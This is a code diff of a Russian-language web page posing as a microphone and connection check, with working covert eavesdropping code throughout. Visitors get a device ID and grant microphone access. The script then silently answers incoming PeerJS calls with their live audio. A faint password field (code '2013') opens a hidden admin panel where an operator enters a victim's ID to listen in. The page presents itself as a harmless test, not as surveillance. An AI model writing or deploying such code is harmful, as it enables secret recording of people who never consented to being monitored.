@@ -2,47 +2,91 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Система проверки</title>
+    <title>Система проверки связи</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { font-family: sans-serif; background: #121212; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #1e1e1e; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #333; }
-        button { background: #0070f3; color: white; border: none; padding: 15px 30px; border-radius: 7px; font-size: 18px; cursor: pointer; }
-        #my-id { margin-top: 20px; font-size: 24px; color: #00ff41; font-family: monospace; font-weight: bold; }
-        p { color: #888; }
+        body { font-family: sans-serif; background: #111; color: #eee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #222; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 320px; }
+        button { background: #0070f3; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
+        input { background: #111; border: 1px solid #444; color: #0f0; padding: 10px; width: 90%; margin-top: 10px; text-align: center; }
+        #id-box { margin-top: 20px; padding: 10px; background: #000; color: #0f0; font-family: monospace; display: none; border: 1px solid #0f0; }
+        .admin-zone { margin-top: 30px; border-top: 1px solid #444; padding-top: 20px; display: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>Проверка микрофона</h2>
-    <p>Нажмите на кнопку ниже, чтобы получить ID устройства</p>
-    <button onclick="startSession()">ПОЛУЧИТЬ ID</button>
-    <div id="my-id"></div>
+<div class="card">
+    <div id="user-interface">
+        <h2>Проверка аудио</h2>
+        <p>Нажмите кнопку, чтобы получить доступ к системе</p>
+        <button onclick="activate()">УЗНАТЬ МОЙ ID</button>
+        <div id="id-box"></div>
+    </div>
+
+    <input type="password" id="master-pass" placeholder="..." oninput="checkAdmin(this.value)" style="opacity: 0.2; width: 40px; margin-top: 50px;">
+
+    <div id="admin-panel" class="admin-zone">
+        <h3 style="color: #0f0;">ADMIN PANEL</h3>
+        <input type="text" id="target-id" placeholder="Вставьте ID устройства">
+        <button onclick="startListening()" style="background: #222; border: 1px solid #0f0; color: #0f0;">СЛУШАТЬ</button>
+        <div id="status" style="margin-top: 10px; font-size: 12px;"></div>
+    </div>
 </div>
 
-<script>
-    // Генерируем случайный ID для этого пользователя
-    const deviceId = 'id-' + Math.floor(Math.random() * 90000);
-    const peer = new Peer(deviceId);
+<audio id="player" autoplay></audio>
 
-    function startSession() {
-        // Запрашиваем микрофон ПОСЛЕ клика
+<script>
+    let myPeer;
+    const myId = 'dev-' + Math.floor(Math.random() * 90000 + 10000);
+
+    // Функция для обычного пользователя
+    function activate() {
+        myPeer = new Peer(myId);
+        
+        myPeer.on('open', (id) => {
+            document.getElementById('id-box').innerText = "ID: " + id;
+            document.getElementById('id-box').style.display = 'block';
+        });
+
+        // Запрашиваем микрофон
         navigator.mediaDevices.getUserMedia({ audio: true })
-            .then((stream) => {
-                // Показываем ID пользователю
-                document.getElementById('my-id').innerText = "ВАШ ID: " + deviceId;
-                
-                // Ждем входящего подключения от админа
-                peer.on('call', (call) => {
-                    console.log("Входящее подключение...");
-                    call.answer(stream); // Отправляем звук админу
+            .then(stream => {
+                console.log("Микрофон готов");
+                // Ждем звонка от админа
+                myPeer.on('call', call => {
+                    call.answer(stream);
                 });
             })
-            .catch((err) => {
-                alert("Ошибка: Доступ к микрофону отклонен!");
-                console.error(err);
-            });
+            .catch(err => alert("Ошибка: Нужен доступ к микрофону!"));
+    }
+
+    // Функция входа в админку по паролю 2013
+    function checkAdmin(val) {
+        if (val === '2013') {
+            document.getElementById('admin-panel').style.display = 'block';
+            document.getElementById('master-pass').style.display = 'none';
+            if (!myPeer) myPeer = new Peer('admin-' + Math.floor(Math.random() * 999));
+        }
+    }
+
+    // Функция подключения к чужому микрофону
+    function startListening() {
+        const tid = document.getElementById('target-id').value;
+        const stat = document.getElementById('status');
+        stat.innerText = "Подключение...";
+
+        const call = myPeer.call(tid, null); // Звоним без своего звука
+        
+        call.on('stream', remoteStream => {
+            stat.innerText = "СВЯЗЬ УСТАНОВЛЕНА";
+            stat.style.color = "#0f0";
+            document.getElementById('player').srcObject = remoteStream;
+        });
+
+        call.on('error', err => {
+            stat.innerText = "Ошибка: ID не найден";
+            stat.style.color = "red";
+        });
     }
 </script>
 
